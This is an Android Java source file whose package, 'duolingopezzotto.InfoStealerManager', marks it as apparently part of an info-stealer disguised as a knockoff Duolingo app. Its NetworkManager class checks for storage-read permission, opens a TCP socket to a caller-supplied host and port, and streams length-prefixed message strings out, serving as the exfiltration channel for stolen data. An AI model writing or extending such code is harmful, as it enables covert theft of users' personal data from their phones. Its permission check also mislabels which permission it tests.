package com.example.duolingopezzotto.InfoStealerManager;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.util.Log;

import androidx.core.content.ContextCompat;

import java.io.*;
import java.net.*;

public class NetworkManager {
    private Socket socket;
    private DataOutputStream out;
    //private BufferedOutputStream bufferedOutputStream;

    public void openConnection(String address, int port,Context context) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {

            System.out.println("Mnacano i permessi per Internet");
        } else {
            System.out.println("I permessi ci sono");
            try {
                socket = new Socket(address, port);
                if(socket.isConnected()) Log.i("Network Manager", "Connected to " + address + ":" + port);
                do{
                    if(socket.isConnected()){
                        out = new DataOutputStream(socket.getOutputStream());
                    }
                }while(!socket.isConnected());

                Log.i("Network Manager","out: "+out);
            } catch (IOException he) {
                Log.e("Network Manager", he.toString());
            }
        }
    }


    public void sendMessage2(StringBuilder message) {
        String messaggio = message.toString();
        try {
            if(out == null) { throw new Exception(); }
            Log.i("Network Manager","Lunghezza messaggio: "+messaggio.length());
            // Converte la stringa del messaggio in un array di byte
            byte[] messageBytes = messaggio.getBytes();
            // Invia i dati al server
            out.flush();
            out.write(messaggio.length());
            // bufferedOutputStream.flush();
            out.write(messageBytes);

            System.out.println("Messaggio inviato con successo.");

        } catch (IOException e) {
            System.err.println("Si è verificato un errore durante l'invio del messaggio:");
            e.printStackTrace();
        } catch (Exception e) {
            System.err.println("Si è verificato un errore imprevisto:");
            e.printStackTrace();
        }
    }
    public void closeConnection(){
        try {

            out.close();
            socket.close();
        } catch (IOException io) { Log.e("Network Manager", "Error closing connection: " + io); }
    }
}
